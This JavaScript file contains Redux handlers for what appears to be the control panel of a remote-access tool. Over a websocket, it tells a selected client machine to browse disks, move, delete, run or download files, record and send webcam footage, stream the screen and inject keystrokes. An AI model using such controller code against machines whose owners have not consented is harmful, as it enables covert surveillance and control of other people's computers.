import {DELETE, DOWNLOAD, MOVE, RUN} from "@redux/actions/fileManagerActions";
import {addProgressBar} from "@redux/slices/fileManagerSlice";
import {
    SEND_WEBCAM_RECORDS,
    START_RECORDING_WEBCAM,
    START_WEBCAM,
    STOP_RECORDING_WEBCAM,
    STOP_WEBCAM,
    WEBCAM_DEVICES
} from "@redux/actions/webcamManagerActions";
import {SELECT_CLIENT} from "@redux/actions/connectionActions";

import {setChannelId} from '@redux/slices/webcamManagerSlice'
import {
    KEY_EXECUTION,
    MONITORS,
    START_SCREEN_STREAMING,
    STOP_SCREEN_STREAMING
} from "@redux/actions/screenManagerActions";

export const handleSelectClient = (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: SELECT_CLIENT,
            client_id: action.payload.client_id,
            set_null: action.payload.set_null
        };
        websocket.send(JSON.stringify(message));
    }
};

export const handleRequestDisks = (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: 'DISKS',
            sendDirectory: action.payload.sendDirectory,
            client_id: action.payload.client_id
        };
        websocket.send(JSON.stringify(message));
    }
};

export const handleCopy = (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: 'COPY',
            from_paths: action.payload.from_paths,
            to_paths: action.payload.to_paths,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
    }
};

export const handleMove = (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: MOVE,
            from_paths: action.payload.from_paths,
            to_path: action.payload.to_paths[0],
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log(message);
        console.log("Moving !! mac: " + action.payload);
    }
}

export const handleDelete = (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: DELETE,
            from_paths: action.payload,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log(message);
        console.log("Delete !! mac: " + action.payload);
    }
}

export const handleRun = (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: RUN,
            from_paths: action.payload,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log(message);
        console.log("Delete !! mac: " + action.payload);
    }
}

export const handleRequestDirectory = (websocket, store, action) => {
    if (websocket) {
        console.log("Final path");
        console.log(action.payload.path);
        const message = {
            ACTION: 'DIRECTORY',
            path: action.payload.path,
            client_id: action.payload.client_id,
            window_id: ""
        };
        websocket.send(JSON.stringify(message));
        console.log("Sending message to " + action.payload.path);
    }
}

export const fetchChannelId = async (store, category) => {
    try {
        const response = await fetch('http://localhost:3055/create-byte-channel', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                client_id: store.getState().client.selectedClient.systemInformation.UUID,
                category: category
            })
        });

        const jsonResponse = await response.json();
        return jsonResponse || null;
    } catch (error) {
        console.error(error);
        return null;
    }
};

export const handleStartWebcam = async (websocket, store, action) => {
    const response = await fetchChannelId(store, "WEBCAM_STREAMING");
    console.log(response)
    if (response === null) {
        console.error("Failed to retrieve channel ID.");
        return;
    }
    if (websocket) {
        const message = {
            ACTION: START_WEBCAM,
            channel_id: response.channel_id,
            selected_device: action.payload.selected_device,
            is_fragmented: action.payload.isFragmented,
            fps: action.payload.fps,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Start webcam to " + action.payload);
    }
}

export const handleDownload =  async (websocket, store, action) => {
    const response = await fetchChannelId(store, "ZIP_FILE");

    if (response === null) {
        console.error("Failed to retrieve channel ID.");
        return;
    }
    store.dispatch(addProgressBar({channel_id: response}));
    if (websocket) {
        const message = {
            ACTION: DOWNLOAD,
            from_path: action.payload,
            channel_id: response.channel_id,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Download to " + action.payload);
    }
}

export const handleStopWebcam =  (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: STOP_WEBCAM,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Stop webcam to " + action.payload);
    }
}

export const handleStartRecording =   (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: START_RECORDING_WEBCAM,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Stop webcam to " + action.payload);
    }
}

export const handleStopRecording =   (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: STOP_RECORDING_WEBCAM,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Stop webcam to " + action.payload);
    }
}

export const handleSendWebcamRecords =  async (websocket, store, action) => {
    const response = await fetchChannelId(store, "WEBCAM_LOGS");

    if (response === null) {
        console.error("Failed to retrieve channel ID.");
        return;
    }
    if (websocket) {
        const message = {
            ACTION: SEND_WEBCAM_RECORDS,
            channel_id: response.channel_id,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Send webcam to " + action.payload);
    }
}

export const handleWebcamDevices =  async (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: WEBCAM_DEVICES,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Download to " + action.payload);
    }
}


export const handleStartStreaming =  async (websocket, store, action) => {
    const response = await fetchChannelId(store, "SCREEN_STREAMING");
    console.log(response)
    if (response === null) {
        console.error("Failed to retrieve channel ID.");
        return;
    }
    if (websocket) {
        const message = {
            ACTION: START_SCREEN_STREAMING,
            channel_id: response.channel_id,
            monitor_id: action.payload.monitor_id,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Start streaming to " + action.payload);
    }
}

export const handleStopStreaming =  (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: STOP_SCREEN_STREAMING,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Stop streaming to " + action.payload);
    }
}

export const handleMonitors =  (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: MONITORS,
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Requesting monitors to " + action.payload);
    }
}

export const handleKey =  (websocket, store, action) => {
    if (websocket) {
        const message = {
            ACTION: KEY_EXECUTION,
            key: JSON.stringify(action.payload),
            client_id: store.getState().client.selectedClient.systemInformation.UUID
        };
        websocket.send(JSON.stringify(message));
        console.log("Request key execution to " + action.payload);
    }
}